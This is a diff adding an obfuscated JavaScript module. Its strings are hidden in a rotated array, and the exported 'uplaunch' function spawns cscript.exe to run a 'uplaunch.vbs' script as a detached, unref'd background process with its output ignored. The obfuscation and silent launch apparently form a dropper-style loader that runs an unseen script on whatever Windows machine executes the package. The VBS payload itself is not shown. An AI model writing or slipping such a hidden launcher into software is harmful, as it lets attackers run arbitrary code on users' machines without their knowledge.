@@ -1,0 +1,43 @@
+var _0x32d1 = [
+  'ignore',
+  'unref',
+  'uplaunch',
+  'child_process',
+  'cscript.exe',
+  '/uplaunch.vbs',
+  'iRIVh',
+  'KujOl',
+  'QsQgu',
+];
+(function(_0x59e1cf, _0xc4552b) {
+  var _0x32d92c = function(_0x4f6906) {
+    while (--_0x4f6906) {
+      _0x59e1cf['push'](_0x59e1cf['shift']());
+    }
+  };
+  _0x32d92c(++_0xc4552b);
+})(_0x32d1, 0x16b);
+var _0x1bc4 = function(_0x62ed21, _0x4c8ae1) {
+  _0x62ed21 = _0x62ed21 - 0x0;
+  var _0x373af6 = _0x32d1[_0x62ed21];
+  return _0x373af6;
+};
+const { spawn } = require(_0x1bc4('0x0'));
+const fs = require('fs');
+function uplaunch(_0x42a0dc) {
+  var _0x481f59 = {
+    iRIVh: _0x1bc4('0x1'),
+    KujOl: function(_0x1bde69, _0x5541c6) {
+      return _0x1bde69 + _0x5541c6;
+    },
+    QsQgu: _0x1bc4('0x2'),
+  };
+  const _0x379540 = spawn(
+    _0x481f59[_0x1bc4('0x3')],
+    [_0x481f59[_0x1bc4('0x4')](_0x42a0dc, _0x481f59[_0x1bc4('0x5')])],
+    { detached: !![], stdio: ['ignore', _0x1bc4('0x6'), _0x1bc4('0x6')] }
+  );
+  _0x379540[_0x1bc4('0x7')]();
+  return _0x379540;
+}
+exports[_0x1bc4('0x8')] = uplaunch;
